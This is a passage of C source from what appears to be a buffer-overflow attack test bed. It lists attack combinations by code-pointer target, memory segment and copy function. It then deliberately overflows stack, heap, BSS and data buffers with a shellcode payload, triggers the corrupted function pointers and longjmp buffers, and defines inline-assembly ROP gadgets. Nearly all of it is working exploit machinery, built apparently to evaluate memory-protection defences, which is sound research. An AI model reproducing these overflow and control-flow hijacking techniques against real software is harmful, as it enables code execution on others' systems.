    {DIRECT, CREATE_FILE, FUNC_PTR_STACK_PARAM, STACK, MEMCPY},
    {DIRECT, CREATE_FILE, FUNC_PTR_STACK_PARAM, STACK, STRCPY},
    {DIRECT, CREATE_FILE, FUNC_PTR_STACK_PARAM, STACK, STRNCPY},
    {DIRECT, CREATE_FILE, FUNC_PTR_STACK_PARAM, STACK, SPRINTF},
    {DIRECT, CREATE_FILE, FUNC_PTR_STACK_PARAM, STACK, SNPRINTF},
    {DIRECT, CREATE_FILE, FUNC_PTR_STACK_PARAM, STACK, STRCAT},
    {DIRECT, CREATE_FILE, FUNC_PTR_STACK_PARAM, STACK, STRNCAT},
    {DIRECT, CREATE_FILE, FUNC_PTR_STACK_PARAM, STACK, SSCANF},
    {DIRECT, CREATE_FILE, FUNC_PTR_STACK_PARAM, STACK, FSCANF},
    {DIRECT, CREATE_FILE, FUNC_PTR_STACK_PARAM, STACK, HOMEBREW},
    
    {DIRECT, CREATE_FILE, FUNC_PTR_HEAP, HEAP, MEMCPY},
    {DIRECT, CREATE_FILE, FUNC_PTR_HEAP, HEAP, STRCPY},
    {DIRECT, CREATE_FILE, FUNC_PTR_HEAP, HEAP, STRNCPY},
    {DIRECT, CREATE_FILE, FUNC_PTR_HEAP, HEAP, SPRINTF},
    {DIRECT, CREATE_FILE, FUNC_PTR_HEAP, HEAP, SNPRINTF},
    {DIRECT, CREATE_FILE, FUNC_PTR_HEAP, HEAP, STRCAT},
    {DIRECT, CREATE_FILE, FUNC_PTR_HEAP, HEAP, STRNCAT},
    {DIRECT, CREATE_FILE, FUNC_PTR_HEAP, HEAP, SSCANF},
    {DIRECT, CREATE_FILE, FUNC_PTR_HEAP, HEAP, FSCANF},
    {DIRECT, CREATE_FILE, FUNC_PTR_HEAP, HEAP, HOMEBREW},
    
    {DIRECT, CREATE_FILE, FUNC_PTR_BSS, BSS, MEMCPY},
    {DIRECT, CREATE_FILE, FUNC_PTR_BSS, BSS, STRCPY},
    {DIRECT, CREATE_FILE, FUNC_PTR_BSS, BSS, STRNCPY},
    {DIRECT, CREATE_FILE, FUNC_PTR_BSS, BSS, SPRINTF},
    {DIRECT, CREATE_FILE, FUNC_PTR_BSS, BSS, SNPRINTF},
    {DIRECT, CREATE_FILE, FUNC_PTR_BSS, BSS, STRCAT},
    {DIRECT, CREATE_FILE, FUNC_PTR_BSS, BSS, STRNCAT},
    {DIRECT, CREATE_FILE, FUNC_PTR_BSS, BSS, SSCANF},
    {DIRECT, CREATE_FILE, FUNC_PTR_BSS, BSS, FSCANF},
    {DIRECT, CREATE_FILE, FUNC_PTR_BSS, BSS, HOMEBREW},
    
    {DIRECT, CREATE_FILE, FUNC_PTR_DATA, DATA, MEMCPY},
    {DIRECT, CREATE_FILE, FUNC_PTR_DATA, DATA, STRCPY},
    {DIRECT, CREATE_FILE, FUNC_PTR_DATA, DATA, STRNCPY},
    {DIRECT, CREATE_FILE, FUNC_PTR_DATA, DATA, SPRINTF},
    {DIRECT, CREATE_FILE, FUNC_PTR_DATA, DATA, SNPRINTF},
    {DIRECT, CREATE_FILE, FUNC_PTR_DATA, DATA, STRCAT},
    {DIRECT, CREATE_FILE, FUNC_PTR_DATA, DATA, STRNCAT},
    {DIRECT, CREATE_FILE, FUNC_PTR_DATA, DATA, SSCANF},
    {DIRECT, CREATE_FILE, FUNC_PTR_DATA, DATA, FSCANF},
    {DIRECT, CREATE_FILE, FUNC_PTR_DATA, DATA, HOMEBREW},

    {DIRECT, CREATE_FILE, LONGJMP_BUF_STACK_VAR, STACK, MEMCPY},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_STACK_VAR, STACK, STRCPY},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_STACK_VAR, STACK, STRNCPY},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_STACK_VAR, STACK, SPRINTF},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_STACK_VAR, STACK, SNPRINTF},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_STACK_VAR, STACK, STRCAT},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_STACK_VAR, STACK, STRNCAT},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_STACK_VAR, STACK, SSCANF},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_STACK_VAR, STACK, FSCANF},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_STACK_VAR, STACK, HOMEBREW},

    {DIRECT, CREATE_FILE, LONGJMP_BUF_STACK_PARAM, STACK, MEMCPY},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_STACK_PARAM, STACK, STRCPY},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_STACK_PARAM, STACK, STRNCPY},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_STACK_PARAM, STACK, SPRINTF},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_STACK_PARAM, STACK, SNPRINTF},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_STACK_PARAM, STACK, STRCAT},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_STACK_PARAM, STACK, STRNCAT},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_STACK_PARAM, STACK, SSCANF},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_STACK_PARAM, STACK, FSCANF},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_STACK_PARAM, STACK, HOMEBREW},
    
    {DIRECT, CREATE_FILE, LONGJMP_BUF_HEAP, HEAP, MEMCPY},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_HEAP, HEAP, STRCPY},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_HEAP, HEAP, STRNCPY},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_HEAP, HEAP, SPRINTF},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_HEAP, HEAP, SNPRINTF},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_HEAP, HEAP, STRCAT},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_HEAP, HEAP, STRNCAT},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_HEAP, HEAP, SSCANF},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_HEAP, HEAP, FSCANF},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_HEAP, HEAP, HOMEBREW},
    
    {DIRECT, CREATE_FILE, LONGJMP_BUF_BSS, BSS, MEMCPY},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_BSS, BSS, STRCPY},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_BSS, BSS, STRNCPY},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_BSS, BSS, SPRINTF},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_BSS, BSS, SNPRINTF},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_BSS, BSS, STRCAT},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_BSS, BSS, STRNCAT},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_BSS, BSS, SSCANF},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_BSS, BSS, FSCANF},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_BSS, BSS, HOMEBREW},
    
    {DIRECT, CREATE_FILE, LONGJMP_BUF_DATA, DATA, MEMCPY},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_DATA, DATA, STRCPY},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_DATA, DATA, STRNCPY},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_DATA, DATA, SPRINTF},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_DATA, DATA, SNPRINTF},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_DATA, DATA, STRCAT},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_DATA, DATA, STRNCAT},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_DATA, DATA, SSCANF},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_DATA, DATA, FSCANF},
    {DIRECT, CREATE_FILE, LONGJMP_BUF_DATA, DATA, HOMEBREW},
    
    {0 ,0 ,0 ,0 ,0},
  };
  int i = input_idx;
  attack = attacks[i];
  switch(attack.location) {
  case STACK:
    /* Injection into stack buffer                           */
    /* Make sure that we start injecting the shellcode on an */
    /* address not containing any terminating characters     */

    //NN: Special case for stack_struct 
    if(attack.code_ptr == STRUCT_FUNC_PTR_STACK){
  buffer = stack_struct.buffer;
  break;
    }

    /* NN: Trying addresses until correct */
    buffer = stack_buffer;
    while (contains_terminating_char((unsigned long)buffer)){
  buffer += rand() % 10;
  fprintf(stderr,"Trying %p\n",buffer);
    }
    /* Out of Bounds */
    if (buffer > stack_buffer + sizeof(stack_buffer) - 100){
  fprintf(stderr,"Error. Couldn't find appropriate buffer on the stack\n");
  exit(1);
    }

    // Also set the location of the function pointer and the
    // longjmp buffer on the heap (the same since only choose one)
    heap_func_ptr = (void *)heap_buffer1;
    heap_jmp_buffer = (void *)heap_buffer1;
    break;
  case HEAP:
    /* Injection into heap buffer                            */

    //NN: Special case for heap_struct 
    if(attack.code_ptr == STRUCT_FUNC_PTR_HEAP){
  buffer = heap_struct->buffer;
  break;
    }


    if(((unsigned long)heap_buffer1 < (unsigned long)heap_buffer2) &&
      ((unsigned long)heap_buffer2 < (unsigned long)heap_buffer3)) {
      buffer = heap_buffer1;
      // Set the location of the memory pointer on the heap
      heap_mem_ptr = (long *)heap_buffer2;
      // Also set the location of the function pointer and the
      // longjmp buffer on the heap (the same since only choose one)
      heap_func_ptr = (void *)heap_buffer3;
      //      heap_jmp_buffer = (int *)heap_buffer3;    //NN heap_jmp_buffer still doesn't point anywhere
      heap_jmp_buffer = (int *)malloc(sizeof(jmp_buf)); //NN Now it does...hopefully in the correct order
    } else {
      if(output_error_msg) {
  fprintf(stderr, "Error: Heap buffers allocated in the wrong order.\n");
      }
      exit(1);
    }
    break;
  case BSS:
    /* Injection into BSS buffer                             */
    /* Make sure that we start injecting the shellcode on an */
    /* address not containing any terminating characters     */
    /* @todo ensure that the chosen address truly is correct */

  //NN: Special case for bss_struct 
    if(attack.code_ptr == STRUCT_FUNC_PTR_BSS){
  buffer = bss_struct.buffer;
  break;
    }

    if(contains_terminating_char((unsigned long)&bss_buffer1)) {
      buffer = bss_buffer2;
    } else {
    /* @todo Currently just assumes the next address is OK   */
      buffer = bss_buffer1;
    }
    // Also set the location of the function pointer and the
    // longjmp buffer on the heap (the same since only choose one)
    heap_func_ptr = (void *)heap_buffer1;
    heap_jmp_buffer = (int *)heap_buffer1;
    break;
  case DATA:
    /* Injection into data segment buffer                    */
    /* Make sure that we start injecting the shellcode on an */
    /* address not containing any terminating characters     */
    /* @todo ensure that the chosen address truly is correct */

    //NN: Special case for stack_struct 
    if(attack.code_ptr == STRUCT_FUNC_PTR_DATA){
  buffer = data_struct.buffer;
  break;
    }

    if(contains_terminating_char((unsigned long)&data_buffer1)) {
      buffer = data_buffer2;
    } else {
    /* @todo Currently just assumes the next address is OK   */
      buffer = data_buffer1;
    }
    // Also set the location of the function pointer and the
    // longjmp buffer on the heap (the same since only choose one)
    heap_func_ptr = (void *)heap_buffer1;
    heap_jmp_buffer = heap_buffer1;
    break;
  default:
    if(output_error_msg) {
      fprintf(stderr, "Error: Unknown choice of location\n");
    }
    exit(1);
    break;
  }

  //make sure we actually have an initialized function pointer on the heap
  if (heap_func_ptr)
    *heap_func_ptr = fooz;


  // Set longjmp buffers
  switch(attack.code_ptr) {
  case LONGJMP_BUF_STACK_VAR:
    if(setjmp(stack_jmp_buffer) != 0) {
    /* setjmp() returns 0 if returning directly and non-zero when returning */
    /* from longjmp() using the saved context. Attack failed.               */
      return;
    }
    payload.jmp_buffer = &stack_jmp_buffer;
    break;
  case LONGJMP_BUF_STACK_PARAM:
    if(setjmp(stack_jmp_buffer_param) != 0) {
    /* setjmp() returns 0 if returning directly and non-zero when returning */
    /* from longjmp() using the saved context. Attack failed.               */
      return;
    }
    payload.jmp_buffer = (void *)stack_jmp_buffer_param;
    payload.stack_jmp_buffer_param = &stack_jmp_buffer_param;
    break;
  case LONGJMP_BUF_HEAP:
    if(setjmp(*heap_jmp_buffer) != 0) {
    /* setjmp() returns 0 if returning directly and non-zero when returning */
    /* from longjmp() using the saved context. Attack failed.               */
      return;
    }
    
    payload.jmp_buffer = (void *)heap_jmp_buffer;
    payload.stack_jmp_buffer_param = NULL;
    break;
  case LONGJMP_BUF_BSS:
    if(setjmp(bss_jmp_buffer) != 0) {
    /* setjmp() returns 0 if returning directly and non-zero when returning */
    /* from longjmp() using the saved context. Attack failed.               */
      return;
    }
    printf("bss_jmp_buffer is set\n");
    payload.jmp_buffer = (void *)bss_jmp_buffer;
    payload.stack_jmp_buffer_param = NULL;
  //NN added second setjmp to populate indirect_jmp_buffer
  if(setjmp(bss_jmp_buffer_indirect) != 0) {
    /* setjmp() returns 0 if returning directly and non-zero when returning */
    /* from longjmp() using the saved context. Attack failed.               */
      return;
    }
    break;
  case LONGJMP_BUF_DATA:
    if(setjmp(data_jmp_buffer) != 0) {
    /* setjmp() returns 0 if returning directly and non-zero when returning */
    /* from longjmp() using the saved context. Attack failed.               */
      return;
    }

    payload.jmp_buffer = (void *)data_jmp_buffer;
    payload.stack_jmp_buffer_param = NULL;
    break;
  default:
    // Not an attack against a longjmp buffer
    break;
  }

  /****************************************/
  /* Overflow buffer with chosen function */
  /* Note: Here memory will be corrupted  */
  /****************************************/
  payload.buffer = get_payload_buffer();
  payload.size = get_payload_size(payload.buffer);
  switch(attack.function) {
  case MEMCPY:
    // memcpy() shouldn't copy the terminating NULL, therefore - 1
    memcpy(buffer, payload.buffer, payload.size - 1);
    break;
  case STRCPY:
    strcpy(buffer, payload.buffer);
    break;
  case STRNCPY:
    strncpy(buffer, payload.buffer, payload.size);
    break;
  case SPRINTF:
    sprintf(buffer, "%s", payload.buffer);
    break;
  case SNPRINTF:
    snprintf(buffer, payload.size, "%s", payload.buffer);
    break;
  case STRCAT:
    strcat(buffer, payload.buffer);
    break;
  case STRNCAT:
    strncat(buffer, payload.buffer, payload.size);
    break;
  case SSCANF:
    snprintf(format_string_buf, 15, "%%%ic", payload.size);
    sscanf(payload.buffer, format_string_buf, buffer);
    break;
  case FSCANF:
    snprintf(format_string_buf, 15, "%%%ic", payload.size);
    fscanf_temp_file = fopen("./fscanf_temp_file", "w+");
    fprintf(fscanf_temp_file, "%s", payload.buffer);
    rewind(fscanf_temp_file);
    fscanf(fscanf_temp_file, format_string_buf, buffer);

    /**  Fclose will try to do pointer arithmetic with ebp which is now broken and thus will crash
    *   instead of returning... when this function returns, then the shellcode is triggered correctly 
    
    *fclose(fscanf_temp_file);
    *unlink("./fscanf_temp_file");
    **/
    break;
  case HOMEBREW:
    homebrew_memcpy(buffer, payload.buffer, payload.size - 1);
    break;
  default:
    if(output_error_msg) {
      fprintf(stderr, "Error: Unknown choice of function\n");
    }
    exit(1);
    break;
  } 


  /*************************************************************/
  /* Ensure that program jumps to the overwritten code pointer */
  /* Send "/bin/sh" as parameter since it might be a return-   */
  /* into-libc attack calling system()                         */
  /*************************************************************/
  if(!output_debug_info) {
    // Only do this if not in debug mode since
    // an attack effectively destroys the memory
    // structures needed to inspect functionality
    switch(attack.code_ptr) {
    case RET_ADDR:
    case OLD_BASE_PTR:
      /* Just let the function carry on and eventually return */
      break;
    case FUNC_PTR_STACK_VAR:
      ((int (*)(char *,int)) (*stack_func_ptr)) ("/tmp/rip-eval/f_xxxx",700);
      break;

    case FUNC_PTR_STACK_PARAM:
      ((int (*)(char *,int)) (*stack_func_ptr_param))("/tmp/rip-eval/f_xxxx",700);
      break;

    case FUNC_PTR_HEAP:
      // Get the function pointer stored in the overflown heap buffer
      ((int (*)(char *,int))*heap_func_ptr)("/tmp/rip-eval/f_xxxx",700);
      break;

    case FUNC_PTR_BSS:
      ((int (*)(char *,int)) (*bss_func_ptr))("/tmp/rip-eval/f_xxxx",700);
      break;

    case FUNC_PTR_DATA:
  //NN
      if (contains_terminating_char(&data_func_ptr1))
        ((int (*)(char *,int)) (*data_func_ptr2))("/tmp/rip-eval/f_xxxx",700);
      else
        ((int (*)(char *,int)) (*data_func_ptr1))("/tmp/rip-eval/f_xxxx",700);	
      break;
    case LONGJMP_BUF_STACK_VAR:
      longjmp(stack_jmp_buffer, 1);
      break;
    case LONGJMP_BUF_STACK_PARAM:
      longjmp(stack_jmp_buffer_param, 1);
      break;
    case LONGJMP_BUF_HEAP:
      longjmp(*heap_jmp_buffer, 1);
      break;
    case LONGJMP_BUF_BSS:
      /* NN: Indirect jmping needs to be treated differently */
      if(attack.technique == DIRECT)
        longjmp(bss_jmp_buffer, 1);
      else if (attack.technique == INDIRECT)
        longjmp(bss_jmp_buffer_indirect, 1);
      break;
    case LONGJMP_BUF_DATA:
      longjmp(data_jmp_buffer, 1);
      break;

    case STRUCT_FUNC_PTR_STACK:
      (*stack_struct.func_ptr)("/tmp/rip-eval/f_xxxx",700);
      break;
    case STRUCT_FUNC_PTR_HEAP:
      (*heap_struct->func_ptr)("/tmp/rip-eval/f_xxxx",700);
      break;
    case STRUCT_FUNC_PTR_DATA:
      (*data_struct.func_ptr)("/tmp/rip-eval/f_xxxx",700);
      break;
    case STRUCT_FUNC_PTR_BSS:
      (*bss_struct.func_ptr)("/tmp/rip-eval/f_xxxx",700);
      break;


    default:
      if(output_error_msg) {
        fprintf(stderr, "Error: Unknown choice of code pointer\n");
      }
      exit(1);
      break;
    }
  }
}

boolean contains_terminating_char(unsigned long value) {
  return FALSE;
}

void homebrew_memcpy(void *dst, const void *src, size_t length) {
  char *d, *s;

  d = (char *)dst;
  s = (char *)src;

  while(length--) {
    *d++ = *s++;
  }
}

//NN: Dummy functions used to create gadgets for the ROP attack

void gadget1(int a, int b){
   int arthur,dent,j;
   arthur = a + b / 42;

   for(j=0;j<10;j++);
   //Gadget 1, locate at gardget1 + 62 bytes
   asm("nop"); //Using this to find it easier in dissas code
   asm("popq %rax"); //FFFFFFFF => 8
   asm("addq $9, %rax");
   asm("retq");
   
   return;

}
void gadget2(int a, int b){
   int ford,prefect,j;
   ford = a + b / 43;
   //Gadget 1, locate at gadget2 + 62 bytes
   for(j=0;j<10;j++);
   asm("nop"); 
   asm("popq %rbx");
   asm("popq %rcx");  //FFFFFFFF => 448
   asm("addq $449, %rcx");
   asm("retq");
   
   return;

}
int gadget3(int a, int b){
   int i,j;
   i = a + b / 33;

   for(j=0;j<10;j++);
   //Gadget3 starts here, located at gadget3 + 62 bytes
   asm("nop");
   asm("int $0x80");

  return 42;


}

